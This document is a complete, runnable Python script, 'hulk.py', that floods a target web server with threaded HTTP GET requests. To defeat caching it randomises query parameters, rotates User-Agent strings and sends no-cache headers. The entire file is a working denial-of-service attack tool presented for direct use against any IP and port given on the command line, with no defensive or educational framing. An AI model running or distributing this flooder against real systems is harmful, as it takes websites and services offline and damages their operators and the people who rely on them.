#!/usr/bin/env python3
# hulk.py <TARGET_IP> [PORT] [DURATIONSEC]
# HULK: flood GET requests with random query params & headers to bypass caching.
import sys
import time
import random
import threading
import urllib.request

TARGET = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 60   # 15 → 60
THREADS = 60

base = f"http://{TARGET}:{PORT}/"
stop = False
sent = 0
lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)",
]

def flood():
    global sent
    while not stop:
        # random query param defeats caching (core HULK trick)
        url = f"{base}?{random.randint(0, 2**31)}={random.randint(0, 2**31)}"
        req = urllib.request.Request(url, headers={
            "User-Agent": random.choice(USER_AGENTS),
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
        })
        try:
            urllib.request.urlopen(req, timeout=2).read()
        except Exception:
            pass
        with lock:
            sent += 1
        time.sleep(0.1)

def main():
    global stop
    print(f"[HULK] target={base} threads={THREADS} duration={DURATION}s")
    ts = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]
    for t in ts:
        t.start()
    time.sleep(DURATION)
    stop = True
    time.sleep(1)
    print(f"[HULK] done, ~{sent} requests sent")

if __name__ == "__main__":
    main()
